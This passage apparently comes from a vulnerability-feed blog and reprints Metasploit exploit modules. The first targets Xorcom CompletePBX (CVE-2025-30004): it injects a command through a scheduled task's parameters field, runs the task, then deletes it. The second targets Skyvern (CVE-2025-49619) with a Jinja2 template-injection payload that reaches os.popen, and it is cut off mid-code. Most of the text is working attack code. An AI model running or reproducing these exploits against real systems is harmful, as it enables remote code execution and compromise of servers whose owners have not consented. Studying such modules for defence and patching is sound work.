class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Xorcom CompletePBX Authenticated Command Injection via Task Scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits an authenticated command injection vulnerability <span class="hljs-keyword">in</span> Xorcom CompletePBX<br>          versions &lt;= <span class="hljs-number">5.2</span>.<span class="hljs-number">35.</span> The issue resides <span class="hljs-keyword">in</span> the task scheduler functionality, where user-controlled<br>          input <span class="hljs-keyword">is</span> improperly sanitized, allowing arbitrary command execution <span class="hljs-keyword">with</span> web server privileges.<br><br>          Only the **superadmin** user (`admin`) has the necessary permissions <span class="hljs-keyword">to</span> trigger this exploit.<br>          Even <span class="hljs-keyword">when</span> creating a <span class="hljs-keyword">new</span> user <span class="hljs-keyword">with</span> maximum privileges, the vulnerability does <span class="hljs-keyword">not</span> work.<br>        &#125;,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Valentin Lobstein&#x27;</span> <span class="hljs-comment"># Research and module development</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-30004&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://www.xorcom.com/products/completepbx/&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://chocapikk.com/posts/2025/completepbx/&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_CMD],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Unix/Linux Command Shell&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-03-02&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX password&#x27;</span>]),<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is running CompletePBX...&#x27;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;No response from target.&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br><br>    doc = res.get_html_document<br><br>    <span class="hljs-keyword">if</span> doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;description&quot;][@content=&quot;CompletePBX&quot;]&#x27;</span>) ||<br>       doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;application-name&quot;][@content=&quot;Ombutel&quot;]&#x27;</span>)<br><br>      print_good(<span class="hljs-string">&quot;Detected CompletePBX on <span class="hljs-subst">#&#123;peer&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">return</span> Exploit::CheckCode::Appears<br>    end<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Target does not appear to be running CompletePBX.&#x27;</span>)<br>  end<br><br>  def login<br>    print_status(<span class="hljs-string">&quot;Attempting authentication with username: <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;userid&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;userpass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target&#x27;</span>)<br>    end<br><br>    <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>)<br>    end<br><br>    sid_cookie = res.get_cookies.scan(<span class="hljs-regexp">/sid=[a-f0-9]+/</span>).first<br><br>    <span class="hljs-keyword">unless</span> sid_cookie<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Authentication failed: No session ID received&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Authentication successful! Session ID: <span class="hljs-subst">#&#123;sid_cookie&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> sid_cookie<br>  end<br><br>  def get_latest_task_id(sid_cookie, task_desc)<br>    print_status(<span class="hljs-string">&quot;Retrieving latest task ID for description: <span class="hljs-subst">#&#123;task_desc&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;tasks&#x27;</span>,<br>        <span class="hljs-string">&#x27;offset&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;max&#x27;</span> =&gt; <span class="hljs-string">&#x27;20&#x27;</span>,<br>        <span class="hljs-string">&#x27;search&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while fetching tasks&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    tasks = json_res[<span class="hljs-string">&#x27;rows&#x27;</span>]<br><br>    <span class="hljs-keyword">unless</span> tasks<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to retrieve task list&#x27;</span>)<br>    end<br><br>    tasks.each <span class="hljs-keyword">do</span> |task|<br>      <span class="hljs-keyword">if</span> task[<span class="hljs-number">2</span>] == task_desc<br>        print_good(<span class="hljs-string">&quot;Found task with ID: <span class="hljs-subst">#&#123;task[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> task[<span class="hljs-number">0</span>]<br>      end<br>    end<br><br>    fail_with(Failure::NotFound, <span class="hljs-string">&quot;Could not find the task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br>  end<br><br>  def create_task(sid_cookie)<br>    task_desc = Faker::Lorem.sentence(word_count: <span class="hljs-number">4</span>)<br>    notes = Faker::Lorem.paragraph(sentence_count: <span class="hljs-number">3</span>)<br>    print_status(<span class="hljs-string">&quot;Creating malicious scheduled task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;script&#x27;</span> =&gt; <span class="hljs-string">&#x27;backup&#x27;</span>,<br>        <span class="hljs-string">&#x27;description&#x27;</span> =&gt; task_desc,<br>        <span class="hljs-string">&#x27;starting&#x27;</span> =&gt; Time.now.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>),<br>        <span class="hljs-string">&#x27;interval&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;interval_unit&#x27;</span> =&gt; <span class="hljs-string">&#x27;month&#x27;</span>,<br>        <span class="hljs-string">&#x27;parameters&#x27;</span> =&gt; <span class="hljs-string">&quot;$(<span class="hljs-subst">#&#123;payload.encoded&#125;</span>)&quot;</span>,<br>        <span class="hljs-string">&#x27;notes&#x27;</span> =&gt; notes,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;save_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;create&#x27;</span><br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while creating task&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    state = json_res[<span class="hljs-string">&#x27;state&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> state == <span class="hljs-string">&#x27;success&#x27;</span><br>      print_good(<span class="hljs-string">&#x27;Malicious task successfully created.&#x27;</span>)<br>      <span class="hljs-keyword">return</span> task_desc<br>    <span class="hljs-keyword">else</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to create the malicious task&#x27;</span>)<br>    end<br>  end<br><br>  def run_task(sid_cookie, task_id)<br>    print_status(<span class="hljs-string">&quot;Executing malicious task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;run_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;run&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while executing task&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&#x27;Task executed successfully!&#x27;</span>)<br>  end<br><br>  def delete_task(sid_cookie, task_id)<br>    %w[<span class="hljs-keyword">delete</span> deleteConfirmed].each <span class="hljs-keyword">do</span> |mode|<br>      print_status(<span class="hljs-string">&quot;Sending delete request (mode=<span class="hljs-subst">#&#123;mode&#125;</span>) for task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>      send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>        <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;delete_task&#x27;</span>,<br>          <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; mode,<br>          <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>        &#125;<br>      &#125;)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Task <span class="hljs-subst">#&#123;task_id&#125;</span> deleted successfully!&quot;</span>)<br>  end<br><br>  def exploit<br>    sid_cookie = login<br>    task_desc = create_task(sid_cookie)<br>    task_id = get_latest_task_id(sid_cookie, task_desc)<br>    run_task(sid_cookie, task_id)<br>    delete_task(sid_cookie, task_id)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Xorcom CompletePBX Authenticated Comman</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Skyvern SSTI Remote Code Execution</title>
    <link href="http://example.com/2025/06/27/github_2122402481/"/>
    <id>http://example.com/2025/06/27/github_2122402481/</id>
    <published>2025-06-27T12:15:13.411Z</published>
    <updated>2025-06-27T12:15:13.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Skyvern SSTI Remote Code Execution</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-49619</li></ul><p><strong>漏洞类型：</strong> 服务端模板注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了Skyvern&lt;&#x3D;0.1.84版本中的服务端模板注入(SSTI)漏洞，允许攻击者通过API密钥发送请求并上传恶意工作流，从而执行远程代码。</p><p><strong>产品厂商：</strong> Skyvern</p><p><strong>产品名称：</strong> Skyvern</p><p><strong>影响版本：</strong> &lt;&#x3D;0.1.84</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/ee890a83ca22a04558273e9724e17c6bfec02a61/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb">https://github.com/rapid7/metasploit-framework/blob/ee890a83ca22a04558273e9724e17c6bfec02a61/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Skyvern SSTI Remote Code Execution&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits SSTI vulnerability in Skyvern&lt;=0.1.84. The module requires API key to deliver requests and upload malicious workflow.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Cristian Branet&#x27;</span>, <span class="hljs-comment"># researcher</span><br>          <span class="hljs-string">&#x27;msutovsky-r7&#x27;</span> <span class="hljs-comment"># module dev</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;EDB&#x27;</span>, <span class="hljs-string">&#x27;52335&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://cristibtz.blog/posts/CVE-2025-49619/&#x27;</span>],<br>          [ <span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-49619&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Linux Target&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Payload&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;BadChars&#x27;</span> =&gt; <span class="hljs-string">%(&quot;)</span> &#125;,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-07&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;API_KEY&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;API key for Skyvern&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow_json</span><br>    &#123;<br>      <span class="hljs-symbol">title:</span> <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(<span class="hljs-number">8</span>),<br>      <span class="hljs-symbol">description:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">proxy_location:</span> <span class="hljs-string">&#x27;RESIDENTIAL&#x27;</span>,<br>      <span class="hljs-symbol">webhook_callback_url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">persist_browser_session:</span> <span class="hljs-literal">false</span>,<br>      <span class="hljs-symbol">model:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">workflow_definition:</span> &#123;<br>        <span class="hljs-symbol">parameters:</span> [],<br>        <span class="hljs-symbol">blocks:</span> [<br>          &#123;<br>            <span class="hljs-symbol">label:</span> <span class="hljs-string">&#x27;block_1&#x27;</span>,<br>            <span class="hljs-symbol">continue_on_failure:</span> <span class="hljs-literal">false</span>,<br>            <span class="hljs-symbol">block_type:</span> <span class="hljs-string">&#x27;task_v2&#x27;</span>,<br>            <span class="hljs-symbol">prompt:</span> <span class="hljs-string">%&lt;&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;\n  &#123;% if &#x27;warning&#x27; in x.__name__ %&#125;\n    &#123;&#123; x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;<span class="hljs-subst">#&#123;payload.encoded&#125;</span>&quot;).read() &#125;&#125;\n  &#123;% endif %&#125;\n&#123;% endfor %&#125;&gt;</span>,<br>            <span class="hljs-symbol">url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-symbol">max_steps:</span> <span class="hljs-number">25</span>,<br>            <span class="hljs-symbol">totp_identifier:</span> <span class="hljs-literal">nil</span>,<br>            <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span><br>          &#125;<br>        ]<br>      &#125;,<br>      <span class="hljs-symbol">is_saved_task:</span> <span class="hljs-literal">false</span><br>    &#125;<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; create_workflow_json.to_json<br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-variable">@workflow_id</span> = res_json.fetch(<span class="hljs-string">&#x27;workflow_permanent_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> <span class="hljs-variable">@workflow_id</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span 